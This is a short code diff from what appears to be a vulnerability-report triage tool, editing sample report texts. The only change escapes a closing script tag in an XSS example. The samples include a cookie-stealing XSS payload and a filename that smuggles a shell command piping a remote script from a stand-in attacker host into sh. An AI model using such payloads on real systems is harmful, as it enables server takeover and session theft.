@@ -84,7 +84,7 @@ const SEVS = {
 const SEV_COLOR = { Critical:"var(--crit)", High:"var(--high)", Medium:"var(--med)", Low:"var(--low)" };
 const EXAMPLES = {
   ex1: "The /api/v1/users/{id}/invoices endpoint returns invoices for any user id. By changing the id parameter while logged in as a normal user I could download other customers' invoices including names and addresses.",
-  ex2: "The search box on /products reflects the q parameter without encoding. Visiting /products?q=<script>alert(document.cookie)</script> executes the script in the victim's browser, allowing session theft.",
+  ex2: "The search box on /products reflects the q parameter without encoding. Visiting /products?q=<script>alert(document.cookie)<\/script> executes the script in the victim's browser, allowing session theft.",
   ex3: "The image resize endpoint passes the filename to ImageMagick via a shell. Uploading a file named `a.png; curl attacker.sh | sh` executes my commands on the server as www-data.",
 };
 
